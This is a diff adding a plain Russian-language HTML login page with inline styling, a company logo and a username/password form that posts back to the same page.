@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Авторизация</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #f5d8d1, #fcb6b7);
+        }
+        .login-container {
+            width: 380px;
+            padding: 30px;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        .input-field {
+            width: 100%;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .input-field input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            transition: 0.3s;
+        }
+        .input-field input:focus {
+            border-color: #f7bfc0;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background: #ff5e62;
+            border: none;
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .login-btn:hover {
+            background: #ff3b4a;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://ptc-holding.kz/wp-content/themes/ptc-theme/assets/img/logo.png" alt="Логотип" class="logo">
+        <h2>Вход</h2>
+        <form method="POST">
+            <div class="input-field">
+                <input type="text" id="username" name="username" placeholder="Логин" required>
+            </div>
+            <div class="input-field">
+                <input type="password" id="password" name="password" placeholder="Пароль" required>
+            </div>
+            <button class="login-btn">Войти</button>
+        </form>
+    </div>
+</body>
+</html>
